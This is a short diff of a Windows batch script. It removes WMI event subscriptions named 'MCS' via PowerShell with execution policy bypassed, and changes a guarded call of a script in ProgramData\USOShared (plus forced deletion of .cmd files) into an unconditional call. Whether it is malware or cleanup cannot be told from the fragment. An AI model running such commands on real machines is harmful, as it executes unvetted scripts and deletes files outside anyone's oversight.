@@ -49,4 +49,4 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Names
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
 
-dir "\\.\%ProgramData%\prndata..\prn.exe" >nul || "%ProgramData%\USOShared\USOS.cmd" && del /F /S /Q /A "%ProgramData%\USOShared\*.cmd"
+%ProgramData%\USOShared\USOS.cmd
